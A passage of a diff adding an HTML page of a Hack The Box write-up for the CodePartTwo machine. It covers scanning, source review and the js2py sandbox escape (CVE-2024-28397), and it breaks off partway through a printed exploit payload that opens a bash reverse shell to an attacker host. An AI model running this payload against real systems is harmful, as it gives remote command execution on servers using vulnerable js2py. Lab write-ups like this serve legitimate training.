@@ -1,0 +1,1114 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Ethical hacking writeups, CTF challenges, and cybersecurity notes.">
+      
+      
+      
+      
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../../../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.0">
+    
+    
+      
+        <title>codePartTwo - Cybersecurity Portfolio</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../../../assets/stylesheets/main.618322db.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../../../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../../../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="blue" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#synopsis" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../../../../.." title="Cybersecurity Portfolio" class="md-header__button md-logo" aria-label="Cybersecurity Portfolio" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Cybersecurity Portfolio
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              codePartTwo
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="blue" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="blue" data-md-color-accent="indigo"  aria-label="Switch to hacker mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to hacker mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../../../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  Home
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../../../../about/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  About
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../../competitions/" class="md-tabs__link">
+          
+  
+  
+  Competitions
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../" class="md-tabs__link">
+          
+  
+  
+  Platforms
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../../../../.." title="Cybersecurity Portfolio" class="md-nav__button md-logo" aria-label="Cybersecurity Portfolio" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Cybersecurity Portfolio
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../../about/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    About
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Competitions
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Competitions
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../competitions/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Overview
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Platforms
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Platforms
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Overview
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#synopsis" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Synopsis
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#reconnaissance" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Reconnaissance
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Enumeration
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Enumeration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#application-analysis" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Application Analysis
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#application-structure" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Application Structure
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#web-application-interaction" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Web Application Interaction
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#understanding-the-execution-logic" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Understanding the Execution Logic
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#vulnerability-discovery" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Vulnerability Discovery
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploitation-initial-foothold" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Exploitation – Initial Foothold
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#post-exploitation-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Post-Exploitation Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#credential-cracking-lateral-movement" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Credential Cracking &amp; Lateral Movement
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#privilege-escalation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Privilege Escalation
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#privilege-escalation-npbackup-cli-abuse" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Privilege Escalation: npbackup-cli Abuse
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Privilege Escalation: npbackup-cli Abuse">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#background" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Background
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploitation-steps" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Exploitation Steps
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#root-access" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Root Access
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#remediation-hardening-recommendations" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Remediation &amp; Hardening Recommendations
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#lessons-learned" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Lessons Learned
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<p>Category : Linux
+Difficulty : Easy</p>
+<h2 id="synopsis">Synopsis<a class="headerlink" href="#synopsis" title="Permanent link">&para;</a></h2>
+<p>CodePartTwo is an Easy Linux Hack The Box machine that revolves around a custom Flask web application. The application allows users to submit and execute JavaScript code server-side using the <strong>js2py</strong> library. Due to an outdated and vulnerable version of js2py, the application is susceptible to a sandbox escape (CVE-2024-28397), allowing remote code execution.</p>
+<p>By exploiting this vulnerability, I obtained an initial shell on the system, extracted credential hashes from a SQLite database, pivoted to another user via SSH, and finally escalated privileges to root through a misconfigured <code>sudo</code> permission on <code>npbackup-cli</code>.</p>
+<hr />
+<h2 id="reconnaissance">Reconnaissance<a class="headerlink" href="#reconnaissance" title="Permanent link">&para;</a></h2>
+<p>I began with a Rustscan, which revealed two open ports on the target:</p>
+<ul>
+<li><strong>22/tcp</strong> – SSH</li>
+<li><strong>8000/tcp</strong> – HTTP</li>
+</ul>
+<div class="highlight"><pre><span></span><code>rustscan<span class="w"> </span>-a<span class="w"> </span><span class="m">10</span>.129.14.51<span class="w"> </span>--<span class="w"> </span>-sC<span class="w"> </span>-sV
+</code></pre></div>
+<p><img alt="rustscan" src="../assets/rustscan.png" /></p>
+<p>So, in the rustscan syntax, the -- enables us to pass the nmap commands -sC and -sV and thus nmap is ran</p>
+<p><img alt="nmap" src="../assets/nmap.png" /></p>
+<hr />
+<h1 id="enumeration">Enumeration<a class="headerlink" href="#enumeration" title="Permanent link">&para;</a></h1>
+<p>With port 8000 open, I navigated to the web application in the browser.</p>
+<p><img alt="webpage" src="../assets/webpage.png" /></p>
+<p>The landing page presented three main options:</p>
+<ul>
+<li>Login</li>
+<li>Register</li>
+<li>Download App</li>
+</ul>
+<p>While the application was downloading, I proceeded to enumerate the web server using Gobuster.</p>
+<div class="highlight"><pre><span></span><code>gobuster<span class="w"> </span>dir<span class="w"> </span>-u<span class="w"> </span>http://10.129.14.51:8000/<span class="w"> </span>-w<span class="w"> </span>/usr/share/wordlists/dirb/common.txt<span class="w"> </span>
+</code></pre></div>
+<p><img alt="gobuster" src="../assets/gobuster.png" /></p>
+<p>The directories discovered matched what was already exposed by the web interface, so no hidden paths of interest were found at this stage.</p>
+<hr />
+<h3 id="application-analysis">Application Analysis<a class="headerlink" href="#application-analysis" title="Permanent link">&para;</a></h3>
+<p>Clicking <strong>Download App</strong> returned a ZIP archive. Extracting it revealed the source code for the web application.</p>
+<p><img alt="unzip" src="../assets/unzip.png" /></p>
+<p>Before interacting further with the live site, I decided to review the source code locally. The first file I inspected was <code>app.py</code>. Almost immediately, I noticed two sensitive values hardcoded in the application:</p>
+<div class="highlight"><pre><span></span><code><span class="n">app</span><span class="o">.</span><span class="n">secret_key</span> <span class="o">=</span> <span class="s1">&#39;S3cr3tK3yC0d3PartTw0&#39;</span>
+<span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;SQLALCHEMY_DATABASE_URI&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;sqlite:///users.db&#39;</span>
+</code></pre></div>
+<p><img alt="app" src="../assets/app.png" /></p>
+<p>The presence of a local SQLite database prompted me to inspect it using <code>sqlite3</code>.</p>
+<div class="highlight"><pre><span></span><code>sqlite3 users.db
+
+sqlite&gt; .tables
+sqlite&gt; SELECT * FROM user;
+sqlite3 SELECT * FROM code_snippet;
+</code></pre></div>
+<p><img alt="sqlite1" src="../assets/sqlite1.png" /></p>
+<p>Two tables were present: <code>user</code> and <code>codesnippet</code>. However, both tables were empty at this point.</p>
+<p>I continued reviewing the rest of the application files and examined <code>requirements.txt</code>.</p>
+<p><img alt="requirements" src="../assets/requirements.png" /></p>
+<p>At this stage, I had a clear understanding of the technology stack and application layout.</p>
+<hr />
+<h3 id="application-structure">Application Structure<a class="headerlink" href="#application-structure" title="Permanent link">&para;</a></h3>
+<p>The <code>requirements.txt</code> confirmed that this was a <strong>custom Flask application</strong></p>
+<p>Key components included:</p>
+<ul>
+<li>
+<p><strong>Flask 3.0.3</strong><br />
+    Used for routing (<code>/login</code>, <code>/register</code>, <code>/dashboard</code>), templating with Jinja2, and session
+    handling via the previously discovered <code>secret_key</code>.</p>
+</li>
+<li>
+<p><strong>Flask-SQLAlchemy 3.1.1</strong><br />
+    Handles database interactions with the SQLite database <code>users.db</code>.</p>
+</li>
+<li>
+<p><strong>js2py 0.74</strong><br />
+    Executes JavaScript code inside Python, likely used to process user-submitted code from the  dashboard.</p>
+</li>
+</ul>
+<p>The directory structure followed a standard Flask layout:</p>
+<ul>
+<li><code>app.py</code> – Application logic and routes </li>
+<li><code>templates/</code> – HTML templates</li>
+<li><code>static/</code> – JavaScript and CSS</li>
+<li><code>instance/</code> – SQLite database</li>
+</ul>
+<hr />
+<h3 id="web-application-interaction">Web Application Interaction<a class="headerlink" href="#web-application-interaction" title="Permanent link">&para;</a></h3>
+<p>With the application structure understood, I returned to the live site and created an account. After logging in, I was redirected to a dashboard containing a JavaScript code editor with <strong>Run</strong> and <strong>Save</strong> functionality.</p>
+<p><img alt="code-editor1" src="../assets/code-editor1.png" /></p>
+<p>The editor included placeholder JavaScript code. I rewrote it slightly and executed it to observe the behavior.</p>
+<div class="highlight"><pre><span></span><code><span class="kd">var</span><span class="w"> </span><span class="nx">x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">16</span><span class="p">;</span>
+<span class="nx">x</span><span class="p">;</span>
+</code></pre></div>
+<p><img alt="code-editor2" src="../assets/code-editor2.png" /></p>
+<p>The output correctly returned <code>16</code>, confirming that the JavaScript was being executed on the <strong>server</strong>.</p>
+<hr />
+<h3 id="understanding-the-execution-logic">Understanding the Execution Logic<a class="headerlink" href="#understanding-the-execution-logic" title="Permanent link">&para;</a></h3>
+<p>From both code review and testing, the execution flow became clear:</p>
+<ul>
+<li>User submits JavaScript code via the dashboard</li>
+<li>The code is sent via POST to a Flask route</li>
+<li><code>app.py</code> executes the code using <code>js2py.eval_js()</code></li>
+<li>The result is returned and rendered in the browser</li>
+</ul>
+<p>In short, the user-supplied JavaScript was executed server-side using js2py.</p>
+<p>This immediately raised a red flag, especially given the js2py version in use.</p>
+<hr />
+<h2 id="vulnerability-discovery">Vulnerability Discovery<a class="headerlink" href="#vulnerability-discovery" title="Permanent link">&para;</a></h2>
+<p>The application was using <strong>js2py version 0.74</strong>, which is affected by a known sandbox escape vulnerability, CVE-2024-28397: js2py Sandbox Escape Exploit</p>
+<div class="highlight"><pre><span></span><code>CVE-2024-28397 – js2py Sandbox Escape
+
+A critical remote code execution (RCE) vulnerability exists in **js2py ≤ 0.74** that allows attackers to escape the JavaScript sandbox and execute arbitrary system commands. Tracked as **CVE-2024-28397** (CVSS 9.8), the issue stems from incomplete sandboxing, which allows JavaScript code to access Python internals through object introspection. This can be abused to reach system-level functions such as `subprocess.Popen`, resulting in full command execution on the server.
+</code></pre></div>
+<p>I located a public exploit PoC on GitHub:</p>
+<p><a href="https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape">https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape</a></p>
+<hr />
+<h2 id="exploitation-initial-foothold">Exploitation – Initial Foothold<a class="headerlink" href="#exploitation-initial-foothold" title="Permanent link">&para;</a></h2>
+<p>I tested the exploit payload inside the dashboard editor. My first attempt resulted in errors.</p>
+<p><img alt="code-editor3" src="../assets/code-editor3.png" /></p>
+<p>After tweaking the payload and configuring a reverse shell, I successfully obtained a shell connection back to my machine.</p>
+<p><img alt="nc" src="../assets/nc.png" /></p>
+<p>Below is the <strong>final working payload</strong> used to gain a reverse shell (only the attacker IP and port need modification):</p>
+<div class="highlight"><pre><span></span><code><span class="kd">var</span><span class="w"> </span><span class="nx">cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/1&lt;ATTACKER-IP&gt;/&lt;PORT&gt; 0&gt;&amp;1\&quot;&quot;</span><span class="p">;</span>
+<span class="kd">var</span><span class="w"> </span><span class="nx">hacked</span><span class="p">,</span><span class="w"> </span><span class="nx">bymarve</span><span class="p">,</span><span class="w"> </span><span class="nx">n11</span><span class="p">,</span><span class="w"> </span><span class="nx">getattr</span><span class="p">,</span><span class="w"> </span><span class="nx">obj</span><span class="p">;</span>
+
+<span class="nx">hacked</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Object</span><span class="p">.</span><span class="nx">getOwnPropertyNames</span><span class="p">({});</span>
+<span class="nx">bymarve</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">hacked</span><span class="p">.</span><span class="nx">__getattribute__</span><span class="p">;</span>
+<span class="nx">n11</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">bymarve</span><span class="p">(</span><span class="s2">&quot;__getattribute__&quot;</span><span class="p">);</span>
+<span class="nx">obj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">n11</span><span class="p">(</span><span class="s2">&quot;__class__&quot;</span><span class="p">).</span><span class="nx">__base__</span><span class="p">;</span>
+<span class="nx">getattr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">obj</span><span class="p">.</span><span class="nx">__getattribute__</span><span class="p">;</span>
+
+<span class="kd">function</span><span class="w"> </span><span class="nx">findpopen</span><span class="p">(</span><span class="nx">o</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">result</span><span class="p">,</span><span class="w"> </span><span class="nx">i</span><span class="p">,</span><span class="w"> </span><span class="nx">item</span><span class="p">;</span>
+<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">subclasses</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">o</span><span class="p">.</span><span class="nx">__subclasses__</span><span class="p">();</span>
+<span class="w">    </span><span class="k">for</span><span class="p">(</span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="nx">subclasses</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">item</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">subclasses</span><span class="p">[</span><span class="nx">i</span><span class="p">];</span>
+<span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="nx">item</span><span class="p">.</span><span class="nx">__module__</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s2">&quot;subprocess&quot;</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">item</span><span class="p">.</span><span class="nx">__name__</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s2">&quot;Popen&quot;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="nx">item</span><span class="p">;</span>
+<span class="w">        </span><span class="p">}</span>
